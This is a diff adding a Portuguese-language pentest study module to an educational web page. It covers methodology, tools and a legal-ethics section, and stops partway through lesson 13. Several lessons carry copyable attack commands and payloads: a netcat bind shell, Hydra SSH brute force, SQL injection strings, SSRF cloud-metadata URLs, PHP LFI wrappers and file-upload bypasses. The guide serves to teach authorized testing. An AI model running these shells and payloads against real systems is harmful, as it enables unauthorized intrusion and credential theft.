@@ -993,13 +993,13 @@
 					<span>Academia OmniVoid • Base de Conhecimento Aberta</span>
 				</div>
 				<p class="academy-hero-desc">
-					Estude livremente a qualquer momento sem limites de vidas ou travas diárias. Explore manuais práticos, cheat sheets, fluxos de engenharia reversa e tutoriais aprofundados para formar sua base técnica antes e durante as Jornadas interativas.
+					Estude livremente a qualquer momento sem limites de vidas ou travas diárias. Explore manuais práticos, guias completos de Pentest, cheat sheets de campo, fluxos de engenharia reversa e tutoriais aprofundados para formar sua base técnica antes e durante as Jornadas interativas.
 				</p>
 			</div>
 
 			<div class="academy-stats-pill">
 				<div class="stat-pill">
-					<div class="stat-pill-val" id="total-lessons-stat">44</div>
+					<div class="stat-pill-val" id="total-lessons-stat">61</div>
 					<div class="stat-pill-lbl">Tópicos Disponíveis</div>
 				</div>
 				<div class="stat-pill">
@@ -1015,7 +1015,11 @@
 
 		<!-- Disciplines Navigation / Modules Selector -->
 		<div class="modules-tab-bar">
-			<button class="module-tab-btn active" onclick="switchModule('hacking', this)">
+			<button class="module-tab-btn active" onclick="switchModule('pentest', this)">
+				<span>🎯 Pentest &amp; Auditoria Ofensiva</span>
+				<span class="module-status-tag tag-live">Disponível</span>
+			</button>
+			<button class="module-tab-btn" onclick="switchModule('hacking', this)">
 				<span>🛡️ Hacking &amp; Cibersegurança</span>
 				<span class="module-status-tag tag-live">Disponível</span>
 			</button>
@@ -1037,17 +1041,677 @@
 			</button>
 		</div>
 
-		<!-- MODULE 1: HACKING & PENTEST -->
-		<div id="module-container-hacking" class="reader-workspace">
+		<!-- ========================================================================= -->
+		<!-- MODULE A: PENTEST & AUDITORIA PRÁTICA (GUIA COMPLETO & DICAS DE CAMPO)   -->
+		<!-- ========================================================================= -->
+		<div id="module-container-pentest" class="reader-workspace">
 			
-			<!-- Sticky Index Sidebar -->
+			<!-- Sticky Index Sidebar Pentest -->
 			<aside class="index-sidebar">
 				<div class="index-search-box">
 					<span class="index-search-icon">🔍</span>
-					<input type="text" id="lessonSearch" class="index-search-input" placeholder="Pesquisar tópico ou ferramenta..." oninput="filterLessons()">
+					<input type="text" id="lessonSearchPentest" class="index-search-input" placeholder="Pesquisar comando, fase ou ferramenta..." oninput="filterLessons('pentest')">
 				</div>
 
-				<div class="index-nav-tree" id="indexNavTree">
+				<div class="index-nav-tree">
+					<!-- Part 1 Pentest -->
+					<div class="index-part-group">
+						<div class="index-part-header">
+							<span>🟢 Pentest Parte 1 — Introdução (1 a 9)</span>
+						</div>
+						<a class="index-item-link" href="#pt-1" onclick="highlightNavItem(this)"><span>1. O que é Pentest &amp; Fases</span><span id="check-pt-1">○</span></a>
+						<a class="index-item-link" href="#pt-2" onclick="highlightNavItem(this)"><span>2. Distros Linux para Pentest</span><span id="check-pt-2">○</span></a>
+						<a class="index-item-link" href="#pt-3" onclick="highlightNavItem(this)"><span>3. Ferramentas por Categoria</span><span id="check-pt-3">○</span></a>
+						<a class="index-item-link" href="#pt-4" onclick="highlightNavItem(this)"><span>4. Comandos Fundamentais</span><span id="check-pt-4">○</span></a>
+						<a class="index-item-link" href="#pt-5" onclick="highlightNavItem(this)"><span>5. Linguagens &amp; Scanner Python</span><span id="check-pt-5">○</span></a>
+						<a class="index-item-link" href="#pt-6" onclick="highlightNavItem(this)"><span>6. Laboratório &amp; Certificações</span><span id="check-pt-6">○</span></a>
+						<a class="index-item-link" href="#pt-7" onclick="highlightNavItem(this)"><span>7. Recursos &amp; Bibliografia</span><span id="check-pt-7">○</span></a>
+						<a class="index-item-link" href="#pt-8" onclick="highlightNavItem(this)"><span>8. Roadmap de 6 a 12 Meses</span><span id="check-pt-8">○</span></a>
+						<a class="index-item-link" href="#pt-9" onclick="highlightNavItem(this)"><span>9. Ética &amp; Marco Civil</span><span id="check-pt-9">○</span></a>
+					</div>
+
+					<!-- Part 2 Pentest -->
+					<div class="index-part-group">
+						<div class="index-part-header">
+							<span>🟡 Pentest Parte 2 — Dicas de Campo (10 a 17)</span>
+						</div>
+						<a class="index-item-link" href="#pt-10" onclick="highlightNavItem(this)"><span>10. Dicas Gerais &amp; Mentalidade</span><span id="check-pt-10">○</span></a>
+						<a class="index-item-link" href="#pt-11" onclick="highlightNavItem(this)"><span>11. Fase 1: Recon Passivo &amp; Ativo</span><span id="check-pt-11">○</span></a>
+						<a class="index-item-link" href="#pt-12" onclick="highlightNavItem(this)"><span>12. Fase 2: Enumeração por Serviço</span><span id="check-pt-12">○</span></a>
+						<a class="index-item-link" href="#pt-13" onclick="highlightNavItem(this)"><span>13. Fase 3: Exploração Real Web</span><span id="check-pt-13">○</span></a>
+						<a class="index-item-link" href="#pt-14" onclick="highlightNavItem(this)"><span>14. Fase 4: Escalação &amp; AD</span><span id="check-pt-14">○</span></a>
+						<a class="index-item-link" href="#pt-15" onclick="highlightNavItem(this)"><span>15. Persistência, Pivoting &amp; 2026</span><span id="check-pt-15">○</span></a>
+						<a class="index-item-link" href="#pt-16" onclick="highlightNavItem(this)"><span>16. Eficiência &amp; Erros a Evitar</span><span id="check-pt-16">○</span></a>
+						<a class="index-item-link" href="#pt-17" onclick="highlightNavItem(this)"><span>17. Estrutura de Relatório Técnico</span><span id="check-pt-17">○</span></a>
+					</div>
+				</div>
+
+				<div class="progress-bar-wrap">
+					<div style="display: flex; justify-content: space-between; font-size: 11px; opacity: 0.8; font-weight: 700;">
+						<span>Progresso do Módulo</span>
+						<span id="sidebar-percent-pentest">0%</span>
+					</div>
+					<div class="study-progress-track">
+						<div class="study-progress-fill" id="sidebar-progress-fill-pentest"></div>
+					</div>
+					<button class="btn-primary" style="width: 100%; justify-content: center; font-size: 11px; padding: 7px; margin-top: 8px;" onclick="window.location.href='pentest.html'">
+						🛡️ Praticar na Jornada Hack
+					</button>
+				</div>
+			</aside>
+
+			<!-- Main Stream of Lessons Pentest -->
+			<main class="reader-content-stream">
+
+				<!-- Banner Pentest Parte 1 -->
+				<div class="part-banner">
+					<div>
+						<div class="part-banner-title">🎯 Guia Completo de Introdução ao Pentest</div>
+						<p style="font-size: 13.5px; opacity: 0.85; margin-top: 4px;">Fundamentos, fases padrão, distros, categorias de ferramentas, comandos essenciais e roadmap prático.</p>
+					</div>
+					<span class="part-badge" style="background: rgba(0, 240, 255, 0.2); border: 1px solid var(--accent-primary); color: var(--accent-primary) !important;">Manual Base</span>
+				</div>
+
+				<!-- PT 1 -->
+				<article class="lesson-card" id="pt-1">
+					<h2 class="lesson-title">
+						<span class="num-badge">01</span>
+						<span>O que é Pentest &amp; Metodologia Padrão</span>
+					</h2>
+					<div class="lesson-body">
+						<p><strong>Teste de Penetração (Penetration Testing):</strong> É a simulação autorizada de ataques cibernéticos contra sistemas, redes e aplicações para identificar vulnerabilidades antes que atacantes reais as explorem.</p>
+						
+						<h3 style="font-size: 16px; margin: 12px 0 6px; color: var(--accent-primary) !important;">Fases de um Pentest (Metodologia Padrão)</h3>
+						<ol>
+							<li><strong>Reconhecimento (Recon):</strong> Coleta de informações abrangente do alvo.</li>
+							<li><strong>Varredura (Scanning):</strong> Identificação de serviços ativos, portas e vulnerabilidades.</li>
+							<li><strong>Exploração (Exploitation):</strong> Obtenção do primeiro ponto de acesso (Initial Access).</li>
+							<li><strong>Pós-exploração (Post-Exploitation):</strong> Escalada de privilégio, movimento lateral e coleta de dados sensíveis.</li>
+							<li><strong>Persistência:</strong> Mecanismos para manter o acesso em testes autorizados.</li>
+							<li><strong>Relatório:</strong> Documentação formal dos riscos e propostas de remediação.</li>
+						</ol>
+
+						<h3 style="font-size: 16px; margin: 16px 0 6px; color: var(--accent-primary) !important;">Metodologias Reconhecidas no Mercado</h3>
+						<ul>
+							<li><strong>OWASP Testing Guide (WSTG):</strong> Foco específico em aplicações web e APIs.</li>
+							<li><strong>PTES (Penetration Testing Execution Standard):</strong> Padrão completo de execução de testes de ponta a ponta.</li>
+							<li><strong>OSSTMM (Open Source Security Testing Methodology Manual):</strong> Metodologia científica e métricas de segurança.</li>
+							<li><strong>MITRE ATT&amp;CK:</strong> Catálogo taxonômico global de táticas e técnicas de atacantes reais.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-1')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 2 -->
+				<article class="lesson-card" id="pt-2">
+					<h2 class="lesson-title">
+						<span class="num-badge">02</span>
+						<span>Sistemas Operacionais para Pentest</span>
+					</h2>
+					<div class="lesson-body">
+						<div class="content-table-wrap">
+							<table class="content-table">
+								<thead>
+									<tr>
+										<th>Distribuição</th>
+										<th>Principais Características</th>
+										<th>Foco Recomendado</th>
+									</tr>
+								</thead>
+								<tbody>
+									<tr>
+										<td><strong>Kali Linux</strong></td>
+										<td>A mais popular do mundo, +600 ferramentas pré-instaladas e enorme comunidade.</td>
+										<td>Padrão da indústria e iniciantes</td>
+									</tr>
+									<tr>
+										<td><strong>Parrot OS</strong></td>
+										<td>Mais leve, ambiente ágil com foco reforçado em privacidade, anonimato e forense.</td>
+										<td>Uso diário e máquinas mais modestas</td>
+									</tr>
+									<tr>
+										<td><strong>BlackArch</strong></td>
+										<td>Baseada em Arch Linux, traz milhares de ferramentas atualizadas continuamente.</td>
+										<td>Usuários avançados de Arch</td>
+									</tr>
+									<tr>
+										<td><strong>BackBox</strong></td>
+										<td>Extremamente leve e estável, baseada na edição LTS do Ubuntu.</td>
+										<td>Auditorias corporativas diretas</td>
+									</tr>
+								</tbody>
+							</table>
+						</div>
+						<p><strong>Recomendação Prática:</strong> Utilize o Kali Linux em uma máquina virtual (VirtualBox ou VMware Workstation) configurada em rede isolada.</p>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-2')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 3 -->
+				<article class="lesson-card" id="pt-3">
+					<h2 class="lesson-title">
+						<span class="num-badge">03</span>
+						<span>Principais Ferramentas por Categoria</span>
+					</h2>
+					<div class="lesson-body">
+						<ul>
+							<li><strong>Reconhecimento / OSINT:</strong> <code>Nmap</code> (portas/serviços), <code>theHarvester</code> (e-mails/subdomínios), <code>Maltego</code> (análise visual de relações), <code>Shodan / Censys</code> (mecanismos de busca de dispositivos expostos), <code>Google Dorks</code>, <code>Recon-ng</code>, <code>Amass</code>.</li>
+							<li><strong>Análise de Vulnerabilidades:</strong> <code>Nessus</code> (scanner comercial), <code>OpenVAS / Greenbone</code> (open source), <code>Nikto</code> (scanner web), <code>WPScan</code> (auditoria WordPress), <code>Nuclei</code> (scanner ultra rápido baseado em templates YAML).</li>
+							<li><strong>Exploração:</strong> <code>Metasploit Framework</code>, <code>searchsploit</code> (busca local Exploit-DB), <code>sqlmap</code> (SQL Injection), <code>Hydra</code> (força bruta online em SSH, FTP, HTTP), <code>John the Ripper / Hashcat</code> (quebra de hashes com GPU), <code>SET</code> (phishing).</li>
+							<li><strong>Web / Proxy:</strong> <code>Burp Suite</code> (interceptador e manipulador HTTP), <code>OWASP ZAP</code> (alternativa open source), <code>ffuf / gobuster / dirb</code> (fuzzing de diretórios e parâmetros).</li>
+							<li><strong>Wireless:</strong> <code>Aircrack-ng</code>, <code>Wifite</code>, <code>hcxdumptool / hcxtools</code> (captura de handshakes PMKID/WPA).</li>
+							<li><strong>Pós-exploração &amp; Privesc:</strong> <code>LinPEAS / WinPEAS</code>, <code>pspy</code> (monitor de processos sem root), <code>BloodHound</code> (Active Directory), <code>Impacket</code> (protocolos Windows via Python), <code>Mimikatz</code> (extração de credenciais LSASS), <code>CrackMapExec / NetExec</code>.</li>
+							<li><strong>Tunneling &amp; Redes:</strong> <code>Netcat (nc)</code>, <code>chisel / ligolo-ng</code>, <code>Proxychains</code>, <code>Wireshark / tcpdump</code>.</li>
+							<li><strong>Relatórios &amp; Notas:</strong> <code>CherryTree / Obsidian</code> (notas estruturadas), <code>Dradis / Faraday</code>, <code>Ghostwriter</code>.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-3')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 4 -->
+				<article class="lesson-card" id="pt-4">
+					<h2 class="lesson-title">
+						<span class="num-badge">04</span>
+						<span>Comandos Fundamentais (Linux / Kali)</span>
+					</h2>
+					<div class="lesson-body">
+						<div class="code-wrapper">
+							<div class="code-header"><span>BASH — Nmap, Recon, Exploração e Shells</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code># Nmap essenciais
+nmap -sV -sC -O alvo.com            # versão, scripts padrão, SO
+nmap -p- 192.168.1.10               # todas as 65535 portas
+nmap --script vuln alvo.com         # scripts de vulnerabilidade
+sudo nmap -sS -Pn -p 80,443 alvo    # SYN scan furtivo
+
+# Recon e enumeração
+gobuster dir -u http://alvo.com -w /usr/share/wordlists/dirb/common.txt
+ffuf -u http://alvo.com/FUZZ -w wordlist.txt
+amass enum -d alvo.com
+enum4linux -a 192.168.1.10
+
+# Exploração e acesso
+sqlmap -u "http://alvo.com/item.php?id=1" --dbs --batch
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+hashcat -m 0 hash.txt rockyou.txt -o saida.txt
+
+# Shells e listener
+nc -lvnp 4444                       # listener reverse shell
+nc -nlvp 4444 -e /bin/bash          # bind shell
+
+# Upgrade para TTY interativo completo no Linux
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Pressione Ctrl+Z, depois digite:
+stty raw -echo; fg</code></pre>
+						</div>
+
+						<div class="code-wrapper">
+							<div class="code-header"><span>BASH &amp; POWERSHELL — Pós-exploração Rápida</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code># Linux
+sudo -l                  # comandos sudo autorizados
+find / -perm -4000 2>/dev/null   # binários SUID
+crontab -l               # crontabs do usuário
+uname -a                 # versão do kernel
+
+# Windows (PowerShell/CMD)
+whoami /priv             # privilégios do token (SeImpersonate etc.)
+systeminfo               # versão e arquitetura
+net user                 # lista de usuários locais
+wmic qfe list            # patches e hotfixes instalados</code></pre>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-4')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 5 -->
+				<article class="lesson-card" id="pt-5">
+					<h2 class="lesson-title">
+						<span class="num-badge">05</span>
+						<span>Linguagens de Programação &amp; Port Scanner Python</span>
+					</h2>
+					<div class="lesson-body">
+						<div class="content-table-wrap">
+							<table class="content-table">
+								<thead>
+									<tr>
+										<th>Linguagem</th>
+										<th>Por Que Aprender em Pentest</th>
+									</tr>
+								</thead>
+								<tbody>
+									<tr>
+										<td><strong>Python</strong></td>
+										<td>A mais importante — automação de exploits, PoCs e scripts rápidos. Bibliotecas: <code>scapy</code>, <code>requests</code>, <code>pwntools</code>, <code>impacket</code>.</td>
+									</tr>
+									<tr>
+										<td><strong>Bash / Shell</strong></td>
+										<td>Essencial para encadear ferramentas e automação rápida de tarefas no Linux.</td>
+									</tr>
+									<tr>
+										<td><strong>JavaScript</strong></td>
+										<td>Necessária para entender e explorar falhas web modernas, XSS, DOM e Node.js.</td>
+									</tr>
+									<tr>
+										<td><strong>PowerShell</strong></td>
+										<td>Fundamental para pós-exploração, automação e ataques em ambientes Windows e Active Directory.</td>
+									</tr>
+									<tr>
+										<td><strong>C / Assembly (x86/x64)</strong></td>
+										<td>Compreensão profunda de buffer overflows, engenharia reversa e desenvolvimento de shellcode.</td>
+									</tr>
+									<tr>
+										<td><strong>Go</strong></td>
+										<td>As ferramentas mais rápidas e modernas de pentest são escritas em Go (<code>ffuf</code>, <code>chisel</code>, <code>ligolo-ng</code>).</td>
+									</tr>
+									<tr>
+										<td><strong>SQL &amp; PHP</strong></td>
+										<td>Essenciais para compreender injeções de banco de dados e auditoria de webshells em aplicações legadas.</td>
+									</tr>
+								</tbody>
+							</table>
+						</div>
+
+						<h3 style="font-size: 16px; margin: 16px 0 8px; color: var(--accent-emerald) !important;">Exemplo de Port Scanner Básico em Python</h3>
+						<div class="code-wrapper">
+							<div class="code-header"><span>PYTHON 3 — Port Scanner com Sockets</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code>import socket
+
+host = "192.168.1.10"
+for port in range(1, 1025):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(0.5)
+    if s.connect_ex((host, port)) == 0:
+        print(f"[+] Porta {port} aberta")
+    s.close()</code></pre>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-5')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 6 -->
+				<article class="lesson-card" id="pt-6">
+					<h2 class="lesson-title">
+						<span class="num-badge">06</span>
+						<span>Laboratórios de Prática &amp; Certificações Reconhecidas</span>
+					</h2>
+					<div class="lesson-body">
+						<p><strong>Plataformas Recomendadas para Prática Legal:</strong></p>
+						<ul>
+							<li><strong>TryHackMe:</strong> Ideal para iniciantes, trilhas guiadas (comece por <em>Pre Security</em> e <em>Jr Penetration Tester</em>).</li>
+							<li><strong>Hack The Box:</strong> Máquinas realistas de nível intermediário a avançado.</li>
+							<li><strong>PortSwigger Web Security Academy:</strong> Gratuita, foco em web — a melhor referência prática para uso do Burp Suite.</li>
+							<li><strong>PentesterLab &amp; VulnHub:</strong> Exercícios web, unix e VMs vulneráveis para rodar no VirtualBox.</li>
+							<li><strong>Proving Grounds (OffSec):</strong> Prática focada no estilo e exigência do OSCP.</li>
+						</ul>
+
+						<h3 style="font-size: 16px; margin: 16px 0 8px; color: var(--accent-gold) !important;">Certificações Globais Reconhecidas</h3>
+						<ul>
+							<li><strong>CompTIA Security+ → PenTest+:</strong> Base conceitual sólida e valorizada no mercado corporativo.</li>
+							<li><strong>eJPT (INE Security):</strong> 100% prática, excelente porta de entrada para auditorias reais.</li>
+							<li><strong>OSCP (OffSec):</strong> A certificação prática mais respeitada mundialmente para pentest ofensivo.</li>
+							<li><strong>CEH (EC-Council):</strong> Teórica e com forte reconhecimento em triagens de RH.</li>
+							<li><strong>GPEN (GIAC) / OSWE / OSEP:</strong> Níveis avançados em web, evasão de defesas e engenharia de exploits.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-6')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 7 -->
+				<article class="lesson-card" id="pt-7">
+					<h2 class="lesson-title">
+						<span class="num-badge">07</span>
+						<span>Recursos de Estudo &amp; Bibliografia Essencial</span>
+					</h2>
+					<div class="lesson-body">
+						<ul>
+							<li><strong>OWASP Top 10:</strong> As 10 vulnerabilidades web mais críticas da atualidade.</li>
+							<li><strong>PortSwigger Academy:</strong> Material interativo gratuito e de altíssima qualidade.</li>
+							<li><strong>Livros de Cabeceira:</strong> <em>The Web Application Hacker's Handbook</em>, <em>RTFM: Red Team Field Manual</em>, <em>Blue Team Field Manual</em>, <em>Practical Malware Analysis</em>.</li>
+							<li><strong>Canais e Criadores no YouTube:</strong> <em>IppSec</em> (walkthroughs detalhados do Hack The Box), <em>John Hammond</em>, <em>LiveOverflow</em>.</li>
+							<li><strong>Repositórios de Privesc:</strong> <a href="https://gtfobins.github.io" target="_blank" style="color:var(--accent-primary)!important;">GTFOBins</a> (Linux) e <a href="https://lolbas-project.github.io" target="_blank" style="color:var(--accent-primary)!important;">LOLBAS</a> (Windows).</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-7')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 8 -->
+				<article class="lesson-card" id="pt-8">
+					<h2 class="lesson-title">
+						<span class="num-badge">08</span>
+						<span>Roadmap Sugerido de 6 a 12 Meses</span>
+					</h2>
+					<div class="lesson-body">
+						<ul>
+							<li><strong>Mês 1–2:</strong> Linux básico/avançado, redes fundamentais (TCP/IP, DNS, HTTP/S) e scripts Bash.</li>
+							<li><strong>Mês 2–3:</strong> Python voltado para automação e fundamentos de segurança (Security+).</li>
+							<li><strong>Mês 3–5:</strong> TryHackMe — trilhas de pentest, Nmap, Metasploit Framework e Burp Suite.</li>
+							<li><strong>Mês 5–7:</strong> Web Exploitation na PortSwigger Academy (SQLi, XSS, SSRF, Autenticação).</li>
+							<li><strong>Mês 7–9:</strong> Escalação de privilégio (Linux e Windows) e fundamentos práticos de Active Directory.</li>
+							<li><strong>Mês 9–12:</strong> Hack The Box ativo, resolução de máquinas intermediárias e realização do eJPT → OSCP.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-8')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 9 -->
+				<article class="lesson-card" id="pt-9">
+					<h2 class="lesson-title">
+						<span class="num-badge">09</span>
+						<span>Ética, Legislação &amp; Marco Civil</span>
+					</h2>
+					<div class="lesson-body">
+						<div class="callout-box legal">
+							<div class="callout-header">⚖️ RESPONSABILIDADE JURÍDICA E ESCOPO</div>
+							Sempre tenha autorização formal por escrito (Regras de Engajamento / Scope Document) antes de iniciar qualquer teste.<br><br>
+							No Brasil, o <strong>Marco Civil da Internet (Lei 12.965/2014)</strong> e o <strong>Código Penal (art. 154-A e 154-B — invasão de dispositivo informático)</strong> criminalizam o acesso não autorizado. "Estar apenas testando" não anula a ilicitude penal. Pratique unicamente em seus próprios ambientes, labs dedicados ou contratos com escopo estritamente delimitado.
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~3 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-9')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+
+				<!-- Banner Pentest Parte 2 -->
+				<div class="part-banner" style="border-color: var(--accent-gold); box-shadow: 0 6px 30px rgba(255, 214, 10, 0.15);">
+					<div>
+						<div class="part-banner-title">🟡 Pentest — Aprofundamento Técnico &amp; Dicas de Campo</div>
+						<p style="font-size: 13.5px; opacity: 0.85; margin-top: 4px;">Metodologia profissional, enumeração exaustiva por serviço, exploração web avançada, Active Directory e escrita de relatórios.</p>
+					</div>
+					<span class="part-badge" style="background: rgba(255, 214, 10, 0.2); border: 1px solid var(--accent-gold); color: var(--accent-gold) !important;">Guia de Campo</span>
+				</div>
+
+				<!-- PT 10 -->
+				<article class="lesson-card" id="pt-10">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-gold);">10</span>
+						<span>Metodologia Profissional (O que Separa Amadores de Mestres)</span>
+					</h2>
+					<div class="lesson-body">
+						<ul>
+							<li><strong>Documente tudo em tempo real:</strong> Comandos, capturas de tela, horários e evidências. Sem print e log, o achado não existe para o cliente. Utilize <em>CherryTree</em> ou <em>Obsidian</em> com uma página dedicada por host.</li>
+							<li><strong>Tenha um checklist por fase:</strong> A maioria dos erros de iniciantes é esquecer de testar algo, e não a falta de conhecimento técnico.</li>
+							<li><strong>Aprofunde antes de expandir:</strong> Um serviço bem enumerado vale mais que 20 varreduras superficiais. 80% dos pwns derivam de enumeração detalhada.</li>
+							<li><strong>Salve tudo o que você enumera:</strong> Versões de serviços, banners e usuários encontrados. O usuário descoberto no recon pode ser a credencial de serviço 3 fases depois.</li>
+							<li><strong>Mantenha listas próprias de credenciais:</strong> Senhas corporativas comuns de teste (<code>password123!</code>, <code>P@ssw0rd</code>, <code>empresa@2026</code>) geram sucessos constantes.</li>
+							<li><strong>Cronometre seu tempo:</strong> Em exames práticos (OSCP, eJPT), o gerenciamento de tempo é 50% da aprovação. Regra de ouro: se travou numa máquina por 2h sem avanço, troque de alvo e retorne depois.</li>
+						</ul>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~4 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-10')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 11 -->
+				<article class="lesson-card" id="pt-11">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-gold);">11</span>
+						<span>Fase 1 — Reconhecimento Aprofundado (Passivo vs Ativo)</span>
+					</h2>
+					<div class="lesson-body">
+						<p><strong>Passivo:</strong> Não toca no alvo (Shodan, certificados crt.sh, Google Dorks, Wayback Machine). Sempre execute primeiro.</p>
+						<p><strong>Ativo:</strong> Interage diretamente com o alvo (Nmap, fuzzing de DNS/vhost). Só execute após o passivo.</p>
+
+						<div class="code-wrapper">
+							<div class="code-header"><span>BASH — Extração de Subdomínios &amp; Nmap com Saída Tripla</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code># Certificados expõem subdomínios (passivo, ouro puro)
+curl -s "https://crt.sh/?q=%25.alvo.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# Varredura completa salvando nos 3 formatos (-oA: normal, greppable e XML)
+nmap -sC -sV -p- -oA scan_completo --open -T4 192.168.1.10
+
+# Scan UDP nas portas mais críticas (lento, porém essencial)
+sudo nmap -sU --top-ports 50 192.168.1.10
+
+# Scripts de enumeração HTTP para diretórios conhecidos
+nmap --script http-enum -p 80,443 alvo.com</code></pre>
+						</div>
+
+						<p><strong>Dicas de Ouro:</strong> Inspecione sempre <code>robots.txt</code>, <code>sitemap.xml</code> e caminhos <code>/.well-known/</code>. Analise arquivos <code>.js</code> expostos com ferramentas como <code>LinkFinder</code> ou <code>katana</code> para localizar endpoints e chaves de API esquecidas.</p>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-11')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 12 -->
+				<article class="lesson-card" id="pt-12">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-gold);">12</span>
+						<span>Fase 2 — Enumeração por Serviço (Cheat Sheet de Campo)</span>
+					</h2>
+					<div class="lesson-body">
+						<div class="code-wrapper">
+							<div class="code-header"><span>BASH — Cheat Sheet de Serviços SMB, SNMP, LDAP e Web</span><button class="copy-btn" onclick="copyCode(this)">📋 Copiar</button></div>
+							<pre><code># SMB (Porta 445)
+enum4linux-ng -A 192.168.1.10
+smbclient -L //alvo -N                      # listar shares anônimos
+smbmap -H alvo -u null                      # permissões de leitura/escrita
+
+# SNMP (Porta 161/UDP) — frequentemente negligenciado
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.10
+snmpwalk -v2c -c public 192.168.1.10        # comunidade 'public' entrega processos e usuários
+
+# LDAP (Porta 389)
+ldapsearch -x -H ldap://alvo -b "dc=empresa,dc=local" "(objectClass=*)"
+
+# Web (80/443) — Sequência de Ataque:
+# 1. Fingerprint de stack com whatweb / wappalyzer
+# 2. Navegação com interceptador Burp Suite ligado
+# 3. Fuzzing com SecLists
+# 4. Dump de repositório .git exposto:
+git-dumper http://alvo.com/.git ./dump
+
+# Fuzzing de virtual hosts (filtrando tamanho fixo de resposta de erro -fs):
+ffuf -u http://alvo -H "Host: FUZZ.alvo.com" -w subdomains.txt -fs 1532</code></pre>
+						</div>
+					</div>
+					<div class="lesson-footer-action">
+						<span style="font-size: 12px; opacity: 0.7;">Tempo de leitura: ~5 min</span>
+						<button class="mark-read-btn" onclick="toggleStudied('pt-12')">✓ Marcar como Estudado</button>
+					</div>
+				</article>
+
+				<!-- PT 13 -->
+				<article class="lesson-card" id="pt-13">
+					<h2 class="lesson-title">
+						<span class="num-badge" style="background: var(--accent-gold);">13</span>
+						<span>Fase 3 — Exploração Web, Shells &amp; Metasploit</span>
+					</h2>
+					<div class="lesson-body">
+						<ul>
+							<li><strong>SQL Injection:</strong> Além de automatizar com <code>sqlmap -r request.txt --dbs</code>, domine a exploração manual (<code>' OR 1=1--</code>, <code>UNION SELECT NULL,NULL,@@version</code>) para ambientes onde payloads automatizados falham por filtros WAF.</li>
+							<li><strong>IDOR / Broken Access Control:</strong> A vulnerabilidade mais abundante em auditorias reais. Teste alterar IDs em rotas de API (ex: <code>/api/user/1050</code> → <code>1049</code>) entre duas contas autenticadas.</li>
+							<li><strong>File Upload Bypasses:</strong> Teste extensões alternativas (<code>.phtml</code>, <code>.php5</code>), dupla extensão (<code>.php.jpg</code>), Content-Type e magic bytes de imagem (cabeçalho <code>GIF89a</code>).</li>
+							<li><strong>SSRF:</strong> Teste chamadas internas (<code>http://127.0.0.1:8080</code>) e endpoints de metadados em nuvem (<code>http://169.254.169.254/latest/meta-data/</code>).</li>
+							<li><strong>LFI &amp; Wrappers PHP:</strong> Extração de código-fonte via Base64 (<code>php://filter/convert.base64-encode/resource=index.php</code>).</li>
+						</ul>
+
+						<div class="code-wrapper">
